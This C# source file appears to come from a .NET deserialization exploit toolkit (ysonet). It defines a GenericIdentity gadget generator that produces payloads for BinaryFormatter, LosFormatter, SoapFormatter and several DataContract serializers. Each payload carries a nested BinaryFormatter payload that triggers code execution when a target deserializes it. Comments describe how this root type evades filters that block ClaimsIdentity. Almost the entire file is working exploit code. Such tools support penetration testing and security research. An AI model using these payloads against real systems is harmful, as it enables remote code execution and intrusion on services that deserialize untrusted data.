using System;
using System.Collections.Generic;
using System.IO;
using ysonet.Helpers;
using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;

namespace ysonet.Generators
{
    public class GenericIdentityGenerator : GenericGenerator
    {
        // Discovery facets (category search only): carries a BinaryFormatter payload
        // in System.Security.Principal.GenericIdentity (mscorlib, built-in).
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.NestedDeserialization)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // reaches the 4.5+ ClaimsIdentity sink; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
        }

        // GenericIdentity is [Serializable], derives from ClaimsIdentity, and is NOT
        // ISerializable. The inherited private field m_serializedClaims is the sink:
        // ClaimsIdentity.OnDeserializedMethod (runs only when the object is not
        // ISerializable) calls DeserializeClaims, which base64-decodes the field and
        // runs a nested BinaryFormatter.Deserialize. This is the same sink as the
        // ClaimsIdentity gadget, reached through a different root type name, useful
        // when a target accepts or casts GenericIdentity but filters ClaimsIdentity.
        //
        // Because GenericIdentity is a derived type, FormatterServices exposes the
        // inherited private field under the prefixed name "ClaimsIdentity+m_serializedClaims"
        // (short base type name, no ancestry name clash). SoapFormatter XML-encodes the
        // plus sign as "_x002B_". GenericIdentity's own required fields m_name and m_type
        // are unprefixed and are included as empty strings so the payload does not rely on
        // BinaryFormatter Simple-mode missing-member tolerance.
        public override string AdditionalInfo()
        {
            return "System.Security.Principal.GenericIdentity (mscorlib, built-in) inherits ClaimsIdentity; "
                + "sets the inherited ClaimsIdentity+m_serializedClaims field, which the OnDeserialized "
                + "callback base64-decodes and runs through a nested BinaryFormatter. Alternate root type "
                + "name for the ClaimsIdentity nested-BinaryFormatter sink.";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "SoapFormatter", "DataContractSerializer", "DataContractJsonSerializer", "NetDataContractSerializer", "LosFormatter" };
        }

        // The DataContract serializers import ClaimsIdentity as a BASE data contract, so the
        // sink member m_serializedClaims sits in the Security.Claims contract namespace while the
        // root element is in the Principal namespace. GenericIdentity's own fields m_name and
        // m_type are required derived-contract members and are emitted null.
        private const string MscorlibAssembly = "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        private const string PrincipalContractNs = "http://schemas.datacontract.org/2004/07/System.Security.Principal";
        private const string ClaimsContractNs = "http://schemas.datacontract.org/2004/07/System.Security.Claims";

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Bridged, GadgetTags.OnDeserialized };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TextFormattingRunPropertiesGenerator();
                binaryFormatterPayload = (byte[])generator.GenerateInner("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                // Hand-built NRBF stream. A real BinaryFormatter.Serialize of a
                // GenericIdentity cannot be used because ClaimsIdentity.OnSerializing
                // overwrites m_serializedClaims with the serialization of the live
                // claims, discarding the injected payload.
                string payload_bf_json = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 1,
      'name': 'System.Security.Principal.GenericIdentity',
      'numMembers': 3,
      'memberNames':['m_name','m_type','ClaimsIdentity+m_serializedClaims'],
      'binaryTypeEnumA':[1,1,1],
      'typeInformationA':[null,null,null],
      'typeInformationB':[null,null,null],
      'memberAssemIds':[0,0,0],
      'assemId': 0
}},{'Id': 3,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 2,
      'value': ''
}},{'Id': 4,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 3,
      'value': ''
}},{'Id': 5,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 4,
      'value': '" + b64encoded + @"'
}},{'Id': 6,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";

                MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(payload_bf_json);

                if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                {
                    if (inputArgs.Test)
                    {
                        try
                        {
                            ms.Position = 0;
                            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                            bf.Deserialize(ms);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return ms.ToArray();
                }
                else
                {
                    // it is LosFormatter
                    byte[] lfSerializedObj = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms.ToArray());

                    MemoryStream ms2 = new MemoryStream(lfSerializedObj);
                    ms2.Position = 0;
                    if (inputArgs.Test)
                    {
                        try
                        {
                            System.Web.UI.LosFormatter lf = new System.Web.UI.LosFormatter();
                            lf.Deserialize(ms2);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return lfSerializedObj;
                }
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {
                // mscorlib type: clr/ns/<Namespace>. The inherited base field is the
                // XML-encoded prefixed name ClaimsIdentity_x002B_m_serializedClaims.
                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
<a1:GenericIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/ns/System.Security.Principal"">
<m_name id=""ref-2""></m_name>
<m_type id=""ref-3""></m_type>
<ClaimsIdentity_x002B_m_serializedClaims id=""ref-4"">{b64encoded}</ClaimsIdentity_x002B_m_serializedClaims>
</a1:GenericIdentity>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";
                if (inputArgs.Minify)
                {
                    payload = XmlMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                string payload = $@"<root type=""System.Security.Principal.GenericIdentity, {MscorlibAssembly}"">
<GenericIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns=""{PrincipalContractNs}"">
<m_serializedClaims xmlns=""{ClaimsContractNs}"">{b64encoded}</m_serializedClaims>
<m_name i:nil=""true""/>
<m_type i:nil=""true""/>
</GenericIdentity>
</root>";
                if (inputArgs.Minify)
                {
                    payload = inputArgs.UseSimpleType ? XmlMinifier.Minify(payload, new string[] { "mscorlib" }, null) : XmlMinifier.Minify(payload, null, null);
                }
                if (inputArgs.Test)
                {
                    try { SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type"); }
                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {
                string payload = $@"<GenericIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Id=""1"" z:Type=""System.Security.Principal.GenericIdentity"" z:Assembly=""0"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns=""{PrincipalContractNs}"">
<m_serializedClaims z:Id=""2"" xmlns=""{ClaimsContractNs}"">{b64encoded}</m_serializedClaims>
<m_name i:nil=""true""/>
<m_type i:nil=""true""/>
</GenericIdentity>
";
                if (inputArgs.Minify)
                {
                    payload = inputArgs.UseSimpleType ? XmlMinifier.Minify(payload, new string[] { "mscorlib" }, null) : XmlMinifier.Minify(payload, null, null);
                }
                if (inputArgs.Test)
                {
                    try { SerializersHelper.NetDataContractSerializer_deserialize(payload); }
                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractjsonserializer"))
            {
                string payload = $@"{{""m_serializedClaims"":""{b64encoded}"",""m_name"":null,""m_type"":null}}";
                if (inputArgs.Minify)
                {
                    payload = inputArgs.UseSimpleType ? JsonMinifier.Minify(payload, new string[] { "mscorlib" }, null) : JsonMinifier.Minify(payload, null, null);
                }
                if (inputArgs.Test)
                {
                    try { SerializersHelper.DataContractJsonSerializer_deserialize(payload, "System.Security.Principal.GenericIdentity, " + MscorlibAssembly, null); }
                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
